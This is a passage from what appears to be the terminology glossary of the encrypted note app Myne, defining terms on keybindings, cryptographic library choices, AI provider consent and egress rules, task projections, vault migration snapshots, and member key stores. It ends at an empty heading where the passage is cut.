The set of user keybinding *overrides* persisted in `vault.prefs` (the `keymap` field, MYND-304): a map from command id to its set of **chord**s. Overrides only — a command absent from the keymap uses its in-code default; a command mapped to an empty set (`[]`) is explicitly unbound (no shortcut). The effective binding is `override ?? default`. Additive optional `MYP1` field (no new magic / major-version event); non-load-bearing (a tampered value can at worst rebind or drop a shortcut — every command stays reachable via the **command palette**).

Used in: `spec/protocol.md` §9.5.2

### **Key Transparency (KT)** &nbsp; ⚠️ *Threat*

A mechanism for publishing user-key bindings to a verifiable log so that clients can detect malicious server-side key substitution. Out of scope for v0.1 (no multi-device or multi-user identity); a later-major-version deliverable.

Used in: `spec/protocol.md` §11

### **label slot** &nbsp; 📦 *Product*

One of a fixed, bounded set of named, theme-aware colors a [color label](#color-label) may take — six muted hue-named slots (matched to Myne's iron/ochre/brick/forest register, not bright Finder tags) plus "none". Defined as `--label-*` design tokens in `docs/design/colors_and_type.css` with light/dark value pairs mirroring the state tokens; the dot is a solid fill (no `-soft` variant). Slots are fixed and hue-named, **not** user-renamable, and are **not** a repurpose of the semantic state colors (`--danger` etc.) — a label must not read as a state. See also [color label](#color-label). (MYND-184)

Used in: `decisions.md` 2026-06-07

### **language pack (Tier 1)** &nbsp; 🛠️ *Tooling*
A per-language CodeMirror 6 grammar package (`@codemirror/lang-*`, or a CM5 stream-mode from `@codemirror/legacy-modes`) that provides syntax tokenization for a fenced code block's body. "Tier 1" distinguishes these from the Tier-0 core editor packs: they are **hand-curated** (not pulled via `@codemirror/language-data`) to keep the dependency tree minimal (TB9), and **eager-imported** (revised 2026-05-29 from the original lazy plan, which didn't color reliably in the Tauri WebView). Adopted in the 2026-05-29 decision (MYND-154).
Used in: `src/editor/code-languages.ts`, `design-notes.md` (2026-05-29).

### **last_backup_at** &nbsp; 📦 *Product*

An optional `vault.prefs` field (Unix epoch seconds, encrypted like every pref) recording when the vault was last exported as a [vault backup file](#vault-backup-file); absent ≡ never backed up. Drives the client's backup reminder. Normative field semantics (omit-when-unset, float ban, the locked-export-cannot-update caveat) live in `spec/protocol.md` §9.5.2.

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-10

### **layering ladder** &nbsp; 🎨 *Design*

The `--z-*` token family in `client-core/src/tokens.css`, which names the stacking order the tree had already been painting at as bare `z-index:` literals. A surface belongs on the step that names its ROLE (a dropdown, a modal, an overlay that must clear a modal) rather than on a value raised until it beat the thing it collided with; the shape that rule prevents is an in-modal `Select` sitting at 60 under a modal backdrop at 1000, with its options unclickable and nothing in either rule saying so. Every value is the one that was already shipping, so naming the ladder restacks nothing; the debt is the call sites still holding the bare number, recorded on the Z-index page. The editor owns a band above the app on purpose, which is why the two sequences are interleaved rather than merged.

Used in: `client-core/src/tokens.css`; `stories/src/stories/docs.tsx`

### **libsodium** &nbsp; 🛠️ *Tooling*

The reference cryptographic library the v0.1 primitive choices are stated against, and the byte-level interoperability target for independent implementations — **not** the library Myne's own clients use. Superseded on the Rust side by the **RustCrypto stack** (`decisions.md` 2026-04-28), which the desktop, mobile and — compiled to `wasm32-unknown-unknown` — **web** clients all run; the Go server uses `golang.org/x/crypto`. Byte-level agreement with libsodium is preserved and machine-checked by `myne-test-vectors/`, which is what keeps the reference role meaningful. No Myne client links libsodium, and none links `libsodium-js`.

Used in: `spec/protocol.md` §2.2

### **libsodium-js** &nbsp; 🛠️ *Tooling*

The WebAssembly/asm.js build of libsodium for JavaScript environments. **Myne's web client does not use it.** The Phase 3 browser client compiles this repository's RustCrypto-based `protocol/` crate to `wasm32-unknown-unknown` and calls the same code the desktop client calls (`decisions.md` 2026-07-26; `spec/protocol.md` §2), so no JavaScript primitive provider exists in the stack at all. The entry is kept because `spec/protocol.md` §5.1.4 still names libsodium-js as guidance for an *independent* JavaScript implementation — `docs/` is CC-BY-4.0 precisely so such an implementation is possible.

Used in: `spec/protocol.md` §5.1.4 (third-party guidance only)

### **left ribbon** &nbsp; 📦 *Product*

The slim icon column at the editor's far-left edge (myne-md/myne#699) that renders a user-chosen, user-ordered set of **registry command ids** as buttons. It is independent of the notes sidebar: collapsing the tree does not hide the rail, which hides only in focus mode and under a width-forced collapse. A command is pinnable if and only if it declares ribbon metadata (an icon) on its `CommandAction`, so eligibility cannot drift from the registry. The layout persists per vault in the encrypted `vault.prefs` (`ribbon_items`, with `ribbon_visible` for the show/hide toggle), both **DeviceLocal** like the bottom-bar and right-panel orders. The rail resolves each pinned command through the registry's per-state visibility: a `hidden` command drops out and the rail reflows, a `disabled` one stays dimmed with its hint. Customized from the Appearance-panel roster, the command palette's Pin toggle, or the rail's own right-click and drag.

*Not to be confused with* [ornament primitive](#ornament-primitive), the `ribbon` value a custom theme may select a custom theme may select.

Used in: `docs/spec/protocol.md` §9.5.2 (`ribbon_items` / `ribbon_visible`); `myne-md/myne#699`

### **libsodium-sys-stable / sodiumoxide** &nbsp; 🛠️ *Tooling*

Rust FFI bindings to the libsodium C library. **Evaluated and rejected — neither is a Myne dependency.** An early stack sketch had the Rust crypto layer bind libsodium through one of these with RustCrypto crates as a fallback; `decisions.md` 2026-04-28 supersedes that clause by name and makes the **RustCrypto stack** the primary Rust provider, chiefly because FFI bindings would drag a vendored C tarball, `cc-rs`, and a per-platform C-compiler matrix into the reproducible-build story (`threat-model.md` §6, TB7/TB9). `protocol/Cargo.toml` names no libsodium binding. The entry is kept for the audit trail. See [libsodium](#libsodium), [RustCrypto](#rustcrypto).

Used in: `decisions.md` 2026-04-26 (Tauri stack realignment, where the binding was first sketched) and 2026-04-28 (which supersedes it)

### **line-focus dimming** &nbsp; 📦 *Product*

A [focus-mode](#focus-mode) reading aid (MYND-348): every editor line except the one the cursor is on is visually dimmed, so the active line stands out. Implemented as a CodeMirror decoration gated by the editor root's `data-focus-dim` attribute (set only when focus mode is active **and** the `editor_focus_dim_inactive` MYP1 pref is on — default on; the Settings → Editor toggle flips it). Respects `prefers-reduced-motion` and the no-pulsing PRODUCT stance — it is a static opacity step, never an animated pulse. Toggleable because some writers find per-line dimming disorienting. Non-load-bearing cosmetic (AS-low). See also [focus mode](#focus-mode), [typewriter scroll](#typewriter-scroll).

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-17 (MYND-348)

### **line-task** &nbsp; 📦 *Product*

A task-list item (`- [ ]` / `- [x]`, `spec/markdown-dialect.md` §3.3) that carries task metadata as [task inline fields](#task-inline-field) on the same line. The unit the task index, the task panel and the query block all operate on. "Line-" is the load-bearing half of the name: a line-task lives entirely within one markdown line — no sidecar, no database row, no identity beyond its position in the note — which is what keeps the commitment that a task is plain markdown and nothing else.

The recognizer does **not** enforce line-task-ness: it recognizes fields on any line, exactly as the inline-tag tokenizer does, so applying the restriction is the consuming layer's obligation (`spec/markdown-dialect.md` §3.8.6).

Used in: `spec/markdown-dialect.md` §3.8; `decisions.md` 2026-07-28

### **line-task projection** &nbsp; 📦 *Product*

The per-note record set the structured index (`vault.indices` / `MYI1`, `spec/protocol.md` §9.8) holds for each [line-task](#line-task): a locator (`line_index`, `raw_line`) plus the five [task inline field](#task-inline-field) values, **every one an opaque verbatim source substring**. Rust stores and returns them and interprets nothing — no date parsing, no comparison, no sorting — because the type authority is `markdown-dialect.md` §3.6.4 and it lives client-side.

The projection is derived, never authoritative: the note files remain the source of truth, deleting the index loses only time, and a blob whose `index_format_version` this client does not understand is rejected before decryption and rebuilt.

Used in: `spec/protocol.md` §9.8.2; `decisions.md` 2026-07-28

### **link reference definition** &nbsp; 📦 *Product*

A `[label]: url` line (CommonMark "link reference definition") that supplies the destination for a [reference link](#reference-link) (`[text][label]`) or a reference-style image (`![alt][label]`) elsewhere in the same note. Labels match by CommonMark rules — case-folded with internal whitespace collapsed — and the first definition of a given label wins. In the Myne editor a shared collector scans all such definition lines into a `label → { target, range }` map; a definition referenced by a resolved reference link is hidden off-cursor (it reads as body noise otherwise) and revealed when the cursor enters its line. The definition bytes are preserved (§6 C1) and the form is never emitted by an authoring affordance. See also [reference link](#reference-link).

Used in: `spec/markdown-dialect.md` §3.2; `decisions.md` 2026-05-30

### **Links tab** &nbsp; 📦 *Product*

*(Aliases: backlinks pane — the pre-MYND-604 name.)*

The right-panel tab answering **both** directions of a note's [bidirectional links](#bidirectional-links) in two counted sections: "linked from" (incoming — the notes that link to the open note) and "links to" (outgoing — the notes it links to). Each direction lists clickable rows that open the target note and shows an explicit empty state when it has none; both recompute from the in-RAM [VaultIndices](#vaultindices) on an index-nonce bump, keeping the previous row array when the result is unchanged so a no-op reindex does not re-render. Renamed from "Backlinks" when the outgoing half landed (MYND-604); the **tab id stays `backlinks`** — it is persisted in every user's `right_panel_tab_order` / `right_panel_hidden_tabs` (`spec/protocol.md` §9.5.2), so only the label changed. Distinct from the sibling **Unlinked** tab, which surfaces [unlinked mentions](#unlinked-mention) rather than explicit links.

### **local inference** &nbsp; 📦 *Product* (*Myne-divergent*)

On-device AI: the local-ai epic (MYND-406–412) runs a **side-loaded** quantized Qwen2 GGUF (generation) and an all-MiniLM-L6-v2 BERT (embedding) through the [Candle](#candle) ML stack, on the user's machine by default. **Amended 2026-08-09:** "on the user's machine, always" is no longer the whole story — a user may name an [AI provider](#ai-provider), and a [remote AI provider](#remote-ai-provider) receives note text off-device. What survives unconditionally is **no telemetry, ever**, and **no model download the user did not ask for**; a model is fetched only on explicit user action from Myne's own origin and verified against a compiled-in digest (myne-md/myne#805, `decisions/ai/0628`), and *nothing leaves until the user names a provider*. *Myne-divergent* because "AI" in most note apps means a server API call; here it is a local, **runtime opt-in beta** capability — it ships in the default build (`decisions.md` 2026-07-02) but stays off until the user enables it at Settings → Developer → AI (`ai_enabled` pref, default off), reachable only once [Developer mode](#developer-mode) is on (`decisions.md` 2026-07-30), and the denylist gate (`ai-no-network-check.sh`) proves what it can actually prove — *no third-party crate in the closure originates outbound requests* — which is a crate-level property, not "this binary cannot reach the network" (`decisions.md` 2026-08-04). The AI-free auditable binary is the `--no-default-features` build. Powers summarize, semantic search / Q&A, [auto-tag](#auto-tag), and the writing-assistant ([ghost-text](#ghost-text) + slash commands). **Three classes of model now, and the distinctions are load-bearing:** the generation and embedding roles are the **user's own side-loaded files** (untrusted input — Myne does not vouch for them), while the *task-models* — transcription (`decisions.md` 2026-07-19) and auto-tag (`decisions.md` 2026-07-31, unbundled by myne-md/myne#805) — are **first-party weights**: transcription still ships bundled inside the desktop build, while the tag model is fetched on explicit user action from Myne's own origin and verified against a compiled-in digest, or side-loaded. (This entry said "the signed, reproducible desktop build" until 2026-08-25 and both words were wrong for desktop: see **code-signed releases** and **reproducible builds** in this file, and entry 0534.) The never-downloaded commitment is superseded (myne-md/myne#805, `decisions/ai/0628`): the tag model is fetched on explicit user action from Myne's own origin and verified against a compiled-in digest, which is the one runtime fetch path on the AI surface. The third class is a **provider-served** model — weights Myne never sees at all, held by a [local model runtime](#local-model-runtime) or a [remote AI provider](#remote-ai-provider). v0.1 runs the runtime in-process for the first two classes, with a sandboxed keyless sidecar deferred as pre-default-on hardening — so a bundled model narrows the supply-chain surface but earns no key-isolation claim. AI outputs are AS1-class RAM, zeroized on lock; excluded per-folder via [AI-excluded folder](#ai-excluded-folder). See `threat-model.md` §7 "Local AI" + `decisions.md` 2026-07-01, 2026-07-02.

### **AI provider** &nbsp; 📦 *Product* (*Myne-divergent*)

*(Not to be confused with [wrap-key provider](#wrap-key-provider), which is a quick-unlock credential source and shares only the word.)*

The abstraction behind which every AI backend sits, and the thing a user **names** to enable one: the bundled or side-loaded in-process runtime, a [local model runtime](#local-model-runtime), or a [remote AI provider](#remote-ai-provider). *Myne-divergent* in a specific way worth stating: `vision.md` carried the phrase "**no provider call**" as an anti-feature, so naming this abstraction "provider" would ordinarily read as a walk-back hiding behind vocabulary. It is used deliberately **because** that clause is superseded (`decisions.md` 2026-08-09) — calling it anything else would have been the disguise. Default is unset, and unset means the code path is unreachable rather than disabled. See also [named provider](#named-provider), [off-device egress](#off-device-egress).

Used in: `decisions.md` 2026-08-09; `threat-model.md` §3 TB12/TB13

### **local model runtime** &nbsp; 📦 *Product*

A model-serving program the **user** installs and runs on their own machine — Ollama today — that Myne reaches over loopback as an [AI provider](#ai-provider). Note plaintext crosses into it (**TB12**) but never leaves the device. Myne does not ship, sign, lockfile or audit it, and its listener is typically unauthenticated loopback, reachable by any local process (**A16**) — which is why the endpoint Myne will talk to is validated loopback-only as a *literal* address, never a resolved one. Distinct from the in-process Candle runtime, which is Myne's own code, and from a [remote AI provider](#remote-ai-provider), which is off-device.

Used in: `threat-model.md` §3 TB12, §1 A16; `decisions.md` 2026-08-09

### **remote AI provider** &nbsp; 📦 *Product*

An off-device AI service the user names — Ollama Cloud or OpenRouter — that receives note plaintext over the network (**TB13**). The **first** thing in Myne's history that sends note content anywhere but a sync server as opaque ciphertext, and the reason this class is bounded on four sides: opt-in and default off, an explicit one-time consent step naming what is sent, barred from every surface that fires without the user asking, and limited to user-initiated work. Its operator is **A17**, an honest-but-curious party that legitimately receives what it is sent; Myne makes no claim about what happens to a request afterwards, and with a broker like OpenRouter cannot even fully enumerate who receives it.

Used in: `threat-model.md` §3 TB13, §1 A17; `decisions.md` 2026-08-09

### **named provider** &nbsp; 📦 *Product*

The state a user puts Myne into by choosing an [AI provider](#ai-provider), and the subject of the invariant that replaced the old no-network claim: **no byte leaves the device unless the user has named a provider.** "Named" is doing real work — it is not "AI is enabled" and not "a provider is reachable", but "the user chose this one". So is **"the user"**, and its scope CHANGED in myne-md/myne#456: the naming is now read at **device** scope. The selection, the key and the chosen model are synced vault content, so a newly enrolled device inherits a configured provider; the **consent record is device-local**, so that device sends nothing until somebody there has read the consent screen and agreed. This entry said the opposite until that change, and recorded the account-scope reading as an accepted residual (ledger SYNC-22, `threat-model.md` §5), which was defensible only while no device could resolve the half-configured state: building the mobile consent surface is what removed the excuse. The key stays shared on purpose, so revocation still reaches every device. Enforced structurally rather than by convention: unset is the default and makes the path unreachable, and an explicit per-file, reason-carrying allowlist governs which source locations may open a socket on the AI path (the ratchet lands **empty**, so every later addition must argue for itself).

Used in: `decisions.md` 2026-08-09; `threat-model.md` §7

### **off-device egress** &nbsp; 📋 *Protocol*

Bytes leaving the machine Myne runs on — as distinct from **loopback**, which does not. The distinction matters because the AI egress gate was re-framed around it and then past it: "no network surface" was already false (`decisions.md` 2026-08-04), "no off-device egress" became false the moment a [remote AI provider](#remote-ai-provider) entered scope, and the property Myne actually holds is the [named provider](#named-provider) one. A term to reach for carefully: *loopback is not off-device, but a local process with a socket is still an egress* — see `threat-model.md` §3 TB12.

Used in: `decisions.md` 2026-08-09, 2026-08-04; `dev/ai-no-egress.md`

### **offline seal** &nbsp; 📦 *Product*

Sealing a device-local secret-bearing entry **at the moment it arrives**, while the vault is locked and `root_key` is unavailable, under a **device-local keychain `wrap_key`** rather than a `root_key`-derived subkey. The watch meeting-capture lane is its worked example: each `transferFile` audio chunk is sealed by the phone's receiver as soon as it is delivered, rather than being left for a later drain the way a dictated capture is staged for the Rust seal. Two things this does NOT do, stated because an earlier revision claimed the stronger version: the OS writes each delivered chunk to the app's inbox in plaintext under Data Protection before any of our code sees it (that window is real and disk-backed, bounded to the delivery-and-seal round-trip), and the receiver MOVES that file into an app-owned inbox rather than leaving it for the OS to reclaim. The seal reuses the share-import queue's existing device-local codec (`MYF1`, `spec/protocol.md` §9.20) and its device key (`md.myne.shareimport`, §9.20.2, deliberately distinct from the capture queue's `md.myne.captures` so the two queues rotate independently), so the window it narrows is a timing property rather than a new format. See also [pending meeting](#pending-meeting), [pending capture](#pending-capture). (`decisions/clients/0647`)

Used in: `decisions/clients/0647`; `spec/protocol.md` §9.20, §9.20.2; `threat-model.md` §7

### **policy refusal** &nbsp; 📦 *Product*

A [remote AI provider](#remote-ai-provider) declining a request under **its own** rules: an account guardrail, a workspace policy, a model the plan does not carry. Its shape is what makes it a term rather than a detail: the provider answers **HTTP 200** and puts an `error` member in the body where the answer belongs, so at the transport layer it is indistinguishable from success. Distinct from a *credential* rejection (401/403), from a *cost* decline (402/429, the quota causes), and from a transport refusal, which is nothing accepting the connection at all. Distinguishing it needs only whether that member is **present**; its text is attacker-influenceable and is never read, logged, stored or shown, because the reply structs type it `Option<serde::de::IgnoredAny>`, which deserializes any value and retains nothing. The user-facing consequence is the reason the term exists: a policy refusal is fixed at the provider, so telling the user to rephrase is wrong advice, and telling them nothing was sent is a false statement, because the note text had already left.

Used in: `decisions.md` 2026-08-15; myne-md/myne#466

### **effective backend** &nbsp; 📦 *Product*

Which AI backend a request **actually** reaches, as opposed to which one the preferences name. The two can differ: selecting the remote arm requires six conditions to hold at once (the AI beta flag, a recognized [AI provider](#ai-provider), matching consent, a stored key, a non-empty model selection, and preferences read from the vault unlocked right now), and any one failing falls back silently to the local arm. It was **seven** until myne-md/myne#456, which removed developer mode from the request-time gate: the control it was standing in for is now the consent, which that change made device-local, and the two are a pair rather than one being dropped. Naming a provider satisfies one of the six, so a caption derived from that alone can claim a backend that answered nothing. **Matching consent means DEVICE-SCOPED consent**: a legacy bare-provider-name value, which is what a device enrolled before the reclassification and a desktop install that turned Developer mode off both hold, fails this condition and falls back to the local arm until the user agrees again (`protocol.md` §9.5.2). Attribution of where a note's text went is a trust surface, so it names this. The separate [trust headline](#trust-headline) deliberately stays on the configured value instead, because over-claiming egress makes a reader cautious while under-claiming tells them their text stayed home when it did not.

Used in: `decisions.md` 2026-08-15; myne-md/myne#466

### **conversational AI chat** &nbsp; 📦 *Product*

The multi-turn chat surface of the AI Chat right-panel tab (`conversational-ai-chat`, MYND-454): a conversation the user can follow up on, with the assistant's answer **streamed** token-by-token (see [streaming token channel](#streaming-token-channel)) and grounded per-turn in the user's own notes (with visible [chat citations](#chat-citation)). It supersedes the earlier single-shot Q&A box. Since myne-md/myne#533 it is also where an [agent run](#agent-run) is started and read: the tab has ONE composer whose Ask/Edit mode says which flow the next message takes, and a run appears as a turn in this same transcript rather than in a second surface (`decisions.md` 2026-08-19). Only the chat's own turns are sent back as conversation history to the ASK model; a run's task was addressed to a different loop, under a scope this call knows nothing about. The reverse direction is not symmetric and changed on 2026-08-30: an [agent run](#agent-run) IS seeded with the visible transcript, under a [chat history budget](#chat-history-budget), so a follow-up can refer to the answer before it (`decisions/ai/0553`). History is **RAM-only, dropped on lock**: no durable, at-rest chat storage in v0.1 (deferred), so no new magic byte or format. Powered by [local inference](#local-inference) (on-device by default, but chat is precisely the surface a user-named [AI provider](#ai-provider) may serve, including a [remote AI provider](#remote-ai-provider), so "no provider call" no longer holds here after 2026-08-09); the model is small and fallible, which is why answers cite their sources. See `decisions.md` 2026-07-04; `threat-model.md` §7 (STI paragraph).

### **streaming token channel** &nbsp; 📋 *Protocol*

The IPC mechanism that streams a [local-inference](#local-inference) generation's tokens to the WebView as they are produced: a `tauri::ipc::Channel<String>` opened by the `chat_stream` command, each decoded token forwarded through a publish-guarded callback (checked against the shared cancel flag before every send, so a vault-lock mid-stream never emits into a torn-down transcript). It is the SYNC-7 "supersede" the local-ai ledger anticipated — streaming was deferred in the spike and added here for the [conversational AI chat](#conversational-ai-chat) surface. Each token is AS1-class plaintext (never logged, DENY-list). See `decisions.md` 2026-07-04.

### **chat history budget** &nbsp; 📦 *Product*

How many CHARACTERS of the visible [conversational AI chat](#conversational-ai-chat) transcript an [agent run](#agent-run) may be seeded with (myne-md/myne#617). Stored as `chat_history_budget` on `PrefsView`, device-local and never synced, because a bound on how much THIS machine sends to a provider is a property of that machine. Default 3000, clamped at the write to 12000.

A character count rather than a turn count, deliberately: the request is re-sent on every one of up to 24 iterations, so the number is multiplied by the iteration count and, on a remote provider, by characters that leave the device. Three long answers and three short ones are the same turn count and a very different cost. Oldest turns are dropped first, and a turn that alone exceeds the budget is truncated and marked rather than dropped, with a matching system-prompt instruction that a shortened earlier message must never be treated as complete.

Its canonical key sorts after `auto_lock_seconds`, which is a format requirement and not a naming preference: see `protocol.md` §9.5.2 on why a new prefs key inside the prefix-matched run silently blinds every field behind it in an older client.

Used in: `decisions/ai/0553`, `protocol.md` §9.5.2, `threat-model.md` TB12, TB13, §7

### **chat citation** &nbsp; 📦 *Product*

A source-note reference shown beneath a grounded [conversational AI chat](#conversational-ai-chat) answer — the `{note_id, byte-range}` chunks the answer was grounded on (reusing the `AskResult.sources` set). Rendered as clickable chips (labelled with the note title) that navigate to the source note. Citations are the honesty counterweight to a small, fallible on-device model: the user verifies each claim against their own words. An answer that grounded on nothing shows no chips (no fabricated citation).

### **local graph** &nbsp; 📦 *Product*

The open note's neighborhood (1-2 hop) subgraph in the [graph view](#graph-view) — the note plus the notes it links to and that link to it, expanded one or two hops (MYND-199). It is a MODE of the graph modal (a note-relative entry centered on the open note), NOT a separate sidebar pane — a deliberate choice to keep the persistent UI calm (a persistent animated graph beside the editor would be the loudest element against the no-decorative-motion canon; deferred behind a dogfood trip-wire as a v1.x canon amendment). A single click pivots (re-centers on the clicked node, no navigation); a double-click opens the note. Selecting the "All" filter chip returns to the whole-vault graph.

Used in: `vision.md` Phase 1 Scope (graph view)

### **legacy snapshot** &nbsp; 📋 *Protocol*

The device-local, pre-migration copy of a vault the [cross-major migration](#migration-cross-major) retains in a `legacy/` directory before its atomic commit point — the old `vault.meta` and blobs, still sealed under the **old** `root_key`. It is the abort-before-sync escape hatch: an abort (valid only pre-sync and pre-confirm) restores the byte-identical old vault from it, and on the user's post-migration confirm it is crypto-erased together with the old `root_key`. Never synced, never backed up. Introduced for the v0.1 → v0.2 `NC05` cut (`spec/protocol.md` §10.4.1).

The staged set includes `snapshots/`, which is **moved** rather than copied: a snapshot is a byte-verbatim `MY01` note blob under the vault's `itemsKey`, so the re-key would otherwise leave it as undecryptable orphan ciphertext in the vault root. **Pre-sync** is a machine-checked condition, not a convention — it is read off the re-key re-base flag (`spec/sync-protocol.md` §5.6.1), which the migration arms and the push publishing the v0.2 head clears. **Until the confirm runs, a password rotation does not revoke access to what is staged**: the snapshot's `vault.meta` wraps the old `root_key` under the old password *and* the old (unrevocable) recovery phrase, while a password change rewrites only the live `vault.meta` (`decisions.md` 2026-08-11).

Used in: `spec/protocol.md` §10.4.1, `decisions.md` 2026-08-09 + 2026-08-11.

### **magic bytes** &nbsp; 📋 *Protocol*

Fixed ASCII byte sequences at the start of Myne on-disk files that identify the format version. v0.1: `MY01` for per-note `.myn` files, `MYV1` for `vault.meta`. **Allocated and shipping under v0.2** (`spec/protocol.md` §10.3, §10.3.1: a vault created today is v0.2 throughout): `NC05` the CRDT note-type, `NTV5` `vault.meta`, plus `MYP5`, `MYA5`, `MYC5`, `MYD5` and `MYT5`. Reserved for the next major version, still placeholders: `NT05` and the remaining `MY?5` values. Magic bytes plus the AAD prefix and context-string prefix together implement the forward-incompatible major-version model.

Used in: `spec/protocol.md` §9.1, §9.2, §9.3, §10.3, §10.7

### **manual test roster** &nbsp; 🛠️ *Tooling*

The recorded answer to "what must a human verify before this release, and why can no machine verify it instead". One entry per feature surface, each carrying the paths that implement it, the clients it ships on, the `e2e/` scenarios that already automate it, and the observations a person must make. It lives in `scripts/manual-test-roster.mjs` and IS the gate, so the record and the check cannot disagree; `docs/dev/manual-test-roster.md` is a generated projection of it and never a second source. Coverage is compared both ways against six directories, `src/screens/`, `src/components/settings/`, `web/src/screens/`, `web/src/components/settings/`, `mobile/src/app/flows/` and `e2e/*.e2e.ts`, so a surface entering the tree fails by name and a verdict whose files are gone fails as stale. Which six is checked too: a shared tree that grows a surface directory outside that list fails by name rather than being skipped. The rule that decides membership is that **an item earns a place only if a machine cannot honestly judge it**: an observation an `e2e/` scenario could assert is [automation debt](#automation-debt-manual-test-roster), not a manual item.

Used in: `scripts/manual-test-roster.mjs`, `scripts/check-manual-test-roster.mjs`, `docs/dev/manual-test-roster.md`, `operations/runbooks/release-checklist.md` phase 1, `decisions.md` 2026-08-21 (manual test roster, myne-md/myne#548)

### **master password** &nbsp; 🗝️ *Key/identifier*

The user's primary authentication credential. Held in user memory only. Fed to Argon2id with `salt_password` to derive `password_wrap_key`, which encrypts a copy of `root_key`. Myne recommends ≥12 characters and zxcvbn score ≥3 at signup; users with weaker passwords are protected primarily by their recovery phrase.

Used in: `spec/protocol.md` §3.1, §4.1

### **member removal** &nbsp; 📦 *Product*

The owner action that ends a person's access to a shared vault (myne-md/myne#711 task 14, `decisions/protocol/0607`). It rotates the vault's group hierarchy: a fresh random `group_key` and `itemsKey` at epoch+1, every per-note/per-attachment/snapshot content key rewrapped under the new `itemsKey` with content ciphertext and every identifier byte-identical (`root_key` untouched), the removed member tombstoned in the owner-signed [group roster](#group-key-epoch), the owner-double-signed retirement records emitted, the rotated `vault.meta` pushed under the owner's per-vault token, and the removed member's server binding and per-vault token revoked (`DELETE /b2b/vaults/{hash}/members/{person_id}`). It is a **future-access revocation only**: a removed member keeps whatever they already synced, copied or exported, and nothing recalls it. A peer adopts the new epoch through the sync meta phase's read path.

Used in: `design-notes/protocol/0607-member-removal-roster-person-id-and-revoke.md`; `docs/spec/sync-protocol.md` §10.3; `myne-md/myne#711`.

### **member vault key store** &nbsp; 🗝️ *Key/identifier*

The device-local `vault.member-key` file that lets a B2B member re-unlock a shared vault without a password (myne-md/myne#711 task 25, `decisions/protocol/0606`). It holds the member's `group_key` and `itemsKey` (64 bytes) AEAD-sealed under a key derived from the member's own normalized recovery phrase under the salt domain `"myne.v0.2 argon2id-person-vault-member|"` (the vault's `account_number_hash` in the salt slot), with AAD `aad_person_member_key_store(vault_id, account_number_hash)`. Device-local, never synced or backed up; a wrong phrase and tampering are the same AEAD failure. A member vault is unlocked by entering the recovery phrase.

Used in: `design-notes/protocol/0606-member-vault-key-store.md`; `docs/spec/protocol.md` §5.2; `myne-md/myne#711`.

### **member vault unlock password** &nbsp; 🗝️ *Key/identifier*

The device-local `vault.member-unlock` file that lets a B2B member re-unlock a shared vault from a member-chosen fast credential instead of retyping the 24-word recovery phrase every session (`decisions/protocol/0653`). It holds `group_key || items_key || items_key_id || group_key_epoch || person_id || person keypair` AEAD-sealed under a KEK that depends on the configured method: a **password** under the salt domain `"myne.v0.2 argon2id-person-vault-member-unlock|"` (a per-device random salt plus the vault's `account_number_hash` in the domain scope), or a **PIN / biometric** derived by the owner quick-unlock wrap-key providers. AAD `aad_person_member_unlock_store(vault_id, account_number_hash)`. The bundled keypair is what makes a fast unlock install the person session too, so sync runs without the phrase; the metadata rides inside the sealed payload so tampering fails closed. Device-local, never synced or backed up; the phrase store (`member vault key store`) remains the portable fallback. A wrong credential and a tampered payload are the same AEAD failure.

Used in: `design-notes/protocol/0653-member-vault-unlock-password.md`; `docs/spec/protocol.md` §5.2.

### **meeting AI sections** &nbsp; 📦 *Product*

The opt-in, machine-generated block a meeting note can gain beneath its verbatim transcript: a summary, action items, decisions and open questions, produced on demand by an on-device (or user-consented remote) AI pass and appended as ordinary markdown under a machine-generated notice distinct from the transcript's own. The block is wrapped in two HTML comment markers, so a regenerate replaces exactly that region and never touches the transcript or user text. It never replaces the transcript (`decisions/ai/0648`, which amends `design-notes/storage/0646`).

Used in: `decisions/ai/0648`; `design-notes/storage/0646`; `docs/threat-model.md` TB13

### **meeting AI prompt** &nbsp; 📦 *Product*

The optional `vault.prefs` field (`meeting_ai_prompt`, `protocol.md` §9.5.2, Shared / scalar-LWW) that replaces the meeting AI pass's reduce instruction verbatim when set. It scopes to the meeting AI feature only, not the other AI surfaces; empty or absent means the built-in default instruction. Classified shared so it reaches the account's other devices.

Used in: `protocol.md` §9.5.2; `sync-protocol.md` §10.2; `decisions/ai/0648`

### **membership roster extension** &nbsp; 📦 *Product*

The `vault.meta` membership field's third shape: NTV5 `reserved` byte
`0x02` (0x00 = base, 0x01 = the 0580 single-account field), carrying one
AEAD envelope (nonce + u32-BE-length + ciphertext, capped at 64 KiB) sealed
under the SAME `membership_key` with the NEW AAD role
`"membership-roster-blob"` and the same `account_number_hash` vault
binding. The inner plaintext is the [vault roster](#vault-roster)'s
canonical JSON. Back-compat: 0x00/0x01 shapes parse unchanged; a reader
handed 0x02 that predates it REJECTS the blob (the §10.2 newer-reads-older
rule stops at an unknown minor revision).

Used in: `design-notes/protocol/0592`; `myne-md/myne#698`.

### **memory entry** &nbsp; 📦 *Product*

One record in [agent memory](#agent-memory): a 16-byte UUIDv7 id (the `memories/<id-hex>` filename), one ≤2000-character distilled text, and a roster row (timestamps + causal `version` + tombstone + quarantine marker) in the `vault.agent-memory` catalog. Written by the model through the `remember` verb (one per run) or by the user through the memory UI, rewritten whole rather than append-merged, and removed everywhere by the tombstone. Model writes carry the writing run's id as the `source_conversation` link, user writes carry none, and a model write naming a user-authored row is refused rather than applied. Sealed as `MYX1` (§9.26) with the entry id + `account_number_hash` bound into the AAD, the `MYE1` archetype.

Used in: `protocol.md` §9.26; `decisions/ai/0590`

### **merge version** &nbsp; 📋 *Protocol*

The monotonic causal counter carried per entry by the synced tombstone-guarded singletons — the [`vault.themes`](#vaultthemes) per-name map (`spec/protocol.md` §9.21.2) and the [`vault.attachments`](#vaultattachments) catalog (§9.10.2) — and the **primary key of their per-entry merge join** (`spec/sync-protocol.md` §10.2.2 / §11.4). On any local mutation of a key it is bumped to `max(versions this device has observed for that key) + 1`; the greater `version` wins a reconcile, and the wall-clock fields (`created_at`/`updated_at`/`deleted_at`) only break an equal-`version` tie (**remove-wins** on tombstone-ness). Because "pick the maximum under a total order" is associative, this closes the three-device CAS ping-pong the earlier `created_at`-vs-`deleted_at` guard admitted (myne-md/myne#405). An additive optional field (`#[serde(default)]`, absent = 0), introducing no `MYC1`/`MYT1` magic, AAD, or version change. Causal, not a wall-clock — it orders edits, it is not a security property. Phase 2.

### **migration (cross-major)** &nbsp; 📋 *Protocol*

